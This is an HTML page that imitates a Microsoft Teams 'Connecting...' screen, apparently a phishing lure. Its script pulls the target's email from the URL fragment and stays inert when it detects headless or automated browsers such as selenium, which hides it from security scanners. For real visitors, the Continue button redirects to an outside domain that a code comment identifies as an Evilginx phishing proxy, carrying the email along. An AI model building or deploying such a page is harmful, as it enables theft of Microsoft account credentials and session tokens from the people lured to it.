<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connecting...</title>
</head>
<body>
<h2>Connecting to Microsoft Teams...</h2>
<button class="teams-button">Continue</button>

<script>
window.addEventListener('load', function() {
  const hash = window.location.hash; // "#target@example.com"
  const email = hash ? hash.substring(1) : '';

  // Headless detection
  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
    console.warn("Headless bot detected; redirect blocked");
    return;
  }

  // Update button to go to Evilginx, preserving hash
  const button = document.querySelector('.teams-button');
  if (button) {
    const baseURL = 'https://access-meetings.visions-solutions.ca/yLobagKc';
    button.addEventListener('click', function() {
      if (email && email.includes('@')) {
        window.location.href = `${baseURL}#${email}`;
      } else {
        window.location.href = baseURL;
      }
    });
  }
});
</script>
</body>
</html>
